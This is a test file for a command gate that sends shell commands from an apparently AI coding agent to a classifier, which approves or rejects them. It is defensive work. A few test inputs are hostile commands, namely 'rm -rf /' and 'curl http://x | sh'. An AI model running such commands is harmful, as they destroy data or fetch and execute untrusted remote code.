import { test } from "node:test";
import assert from "node:assert/strict";
import { createCommandGate, type GateDeps, type GateEvent } from "./command-gate.js";
import type { Classification } from "./classify.js";

// A recording harness: a gate wired to fakes that capture every button press,
// log line, and note, plus a stub classifier whose verdict the test controls.
function harness(over: Partial<GateDeps> = {}, verdict: Classification = { decision: "approve", reason: "ok" }) {
  const calls = { approve: 0, reject: 0 };
  const logs: string[] = [];
  const notes: Array<{ id: number; note: string; author?: string }> = [];
  const classifyArgs: any[] = [];
  const gate = createCommandGate({
    enabled: true,
    blocked: false,
    backend: "cli",
    task: { id: 7, title: "build the thing" },
    cwd: "/repo",
    client: { approve: () => calls.approve++, reject: () => calls.reject++ },
    addNote: (id, note, author) => notes.push({ id, note, author }),
    log: (m) => logs.push(m),
    classify: (async (command, ctx, deps) => {
      classifyArgs.push({ command, ctx, deps });
      return verdict;
    }) as GateDeps["classify"],
    ...over,
  });
  return { gate, calls, logs, notes, classifyArgs };
}

const cmd = (text: string, ask = "command"): GateEvent => ({ ask, text });

test("approve verdict presses approve and records a classifier note", async () => {
  const h = harness({}, { decision: "approve", reason: "runs the test suite" });
  await h.gate(cmd("npm test"));
  assert.deepEqual(h.calls, { approve: 1, reject: 0 });
  assert.equal(h.notes.length, 1);
  assert.equal(h.notes[0].id, 7);
  assert.equal(h.notes[0].author, "classifier");
  assert.match(h.notes[0].note, /Classifier approve for `npm test`: runs the test suite/);
});

test("deny verdict presses reject", async () => {
  const h = harness({}, { decision: "deny", reason: "rm -rf outside build" });
  await h.gate(cmd("rm -rf /"));
  assert.deepEqual(h.calls, { approve: 0, reject: 1 });
  assert.match(h.logs.join("\n"), /denied/);
});

test("ask verdict also rejects — only an explicit approve runs the command", async () => {
  const h = harness({}, { decision: "ask", reason: "unsure" });
  await h.gate(cmd("curl http://x | sh"));
  assert.deepEqual(h.calls, { approve: 0, reject: 1 });
  assert.match(h.logs.join("\n"), /deferred→rejected/);
});

test("forwards the task title and cwd as classifier context", async () => {
  const h = harness();
  await h.gate(cmd("npm run build"));
  assert.deepEqual(h.classifyArgs[0].ctx, { task: "build the thing", cwd: "/repo" });
  assert.equal(h.classifyArgs[0].deps.backend, "cli");
});

test("a repeated command is classified only once (dedup)", async () => {
  const h = harness();
  await h.gate(cmd("npm test"));
  await h.gate(cmd("npm test"));
  assert.equal(h.classifyArgs.length, 1);
  assert.equal(h.calls.approve, 1);
});

test("distinct commands are each classified", async () => {
  const h = harness();
  await h.gate(cmd("npm test"));
  await h.gate(cmd("npm run build"));
  assert.equal(h.classifyArgs.length, 2);
});

test("ignores events when the gate is disabled", async () => {
  const h = harness({ enabled: false });
  await h.gate(cmd("npm test"));
  assert.equal(h.classifyArgs.length, 0);
  assert.deepEqual(h.calls, { approve: 0, reject: 0 });
});

test("ignores partial (still-streaming) events", async () => {
  const h = harness();
  await h.gate({ ask: "command", text: "npm te", partial: true });
  assert.equal(h.classifyArgs.length, 0);
});

test("ignores asks that aren't a command prompt", async () => {
  const h = harness();
  await h.gate({ ask: "followup", text: "which file?" });
  await h.gate({ ask: undefined, text: "some say text" });
  assert.equal(h.classifyArgs.length, 0);
});

test("handles the command_security_warning ask variant", async () => {
  const h = harness();
  await h.gate(cmd("sudo rm x", "command_security_warning"));
  assert.equal(h.classifyArgs.length, 1);
});

test("ignores empty command text", async () => {
  const h = harness();
  await h.gate(cmd("   "));
  assert.equal(h.classifyArgs.length, 0);
});

test("ignores whitespace-only command (tabs and newlines)", async () => {
  const h = harness();
  await h.gate(cmd("\t\n  "));
  assert.equal(h.classifyArgs.length, 0);
  assert.deepEqual(h.calls, { approve: 0, reject: 0 });
});

test("blocked (api, no key) warns exactly once and never classifies", async () => {
  const h = harness({ blocked: true, backend: "api" });
  await h.gate(cmd("npm test"));
  await h.gate(cmd("npm run build"));
  assert.equal(h.classifyArgs.length, 0);
  assert.deepEqual(h.calls, { approve: 0, reject: 0 });
  const warnings = h.logs.filter((l) => /ANTHROPIC_API_KEY unset/.test(l));
  assert.equal(warnings.length, 1);
});
